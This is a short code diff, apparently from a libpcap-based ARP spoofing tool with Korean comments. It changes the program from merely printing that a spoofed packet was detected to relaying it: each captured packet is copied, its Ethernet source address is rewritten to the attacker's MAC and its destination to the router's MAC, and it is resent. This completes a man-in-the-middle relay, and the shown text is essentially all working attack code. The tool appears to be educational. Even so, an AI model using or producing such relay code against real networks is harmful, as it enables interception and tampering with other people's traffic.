@@ -206,7 +206,17 @@ int main(int argc, char* argv[]) {
 
 		for (const Flow& flow : flows) {
 			if (ethHdr->smac() != flow.senderMac) continue;
-			printf("Spoofed packet detected from %s\n", std::string(flow.senderIp).c_str());
+
+			// Ethernet 헤더만 변경하여 재전송
+			uint8_t relayPkt[header->caplen];
+			memcpy(relayPkt, pkt, header->caplen);
+
+			EthHdr* relayEth = (EthHdr*)relayPkt;
+			relayEth->smac_ = attackerMac; // smac은 공격자 MAC 주소
+			relayEth->dmac_ = flow.targetMac; // dmac은 라우터 MAC 주소
+
+			pcap_sendpacket(pcap, relayPkt, header->caplen);
+			printf("%s > relay %d bytes\n", std::string(flow.senderIp).c_str(), header->caplen);
 			break;
 		}
 	}
